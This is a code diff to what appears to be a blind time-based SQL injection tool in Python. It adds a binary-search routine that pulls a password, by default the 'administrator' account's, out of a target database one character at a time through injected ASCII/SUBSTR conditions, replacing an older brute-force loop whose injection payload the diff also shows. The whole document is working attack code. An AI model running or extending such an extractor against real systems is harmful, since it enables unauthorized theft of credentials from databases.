@@ -29,20 +29,29 @@ class BlindTimeBased(BaseSQLi):
         print("[-] Could not detect password length.")
         return None
 
+    def extract_char_binary(self, column, position, username='administrator'):
+        substr = DB_CONFIG[self.db_type]['substr']
+        low = 32
+        high = 126
+        while low < high:
+            mid = (low + high) // 2
+            condition = f"ASCII({substr}((SELECT {column} FROM {self.targetTable} WHERE username='{username}'),{position},1))>{mid}"
+            payload = self.build_condition_payload(condition)
+            start_time = time.time()
+            response = self.send(payload)
+            self._last_elapsed = time.time() - start_time
+            if self.check_signal(response):
+                low = mid + 1
+            else:
+                high = mid
+        return chr(low)
+
     def extract(self, column, username='administrator'):
         length = self.detect_length(column, username)
         if not length:
             return None
         for position in range(1, length + 1):
-            for char in string.ascii_lowercase + string.ascii_uppercase + string.digits + "!@#$%^&*":
-                payload = f"'||(SELECT CASE WHEN ({DB_CONFIG[self.db_type]['substr']}((SELECT {column} FROM {self.targetTable} WHERE username='{username}'),{position},1)='{char}') THEN {self.signal} ELSE 0 END{DB_CONFIG[self.db_type]['from_dual']})||'"
-                start_time = time.time()
-                response = self.send(payload)
-                elapsed_time = time.time() - start_time
-                if elapsed_time >= self.delay:
-                    self.found_password += char
-                    print(f"[+] Position {position}: {char}  →  {self.found_password}")
-                    break
-            else:
-                break
+            char = self.extract_char_binary(column, position, username)
+            self.found_password += char
+            print(f"[+] Position {position}: {char}  →  {self.found_password}")
         return self.found_password
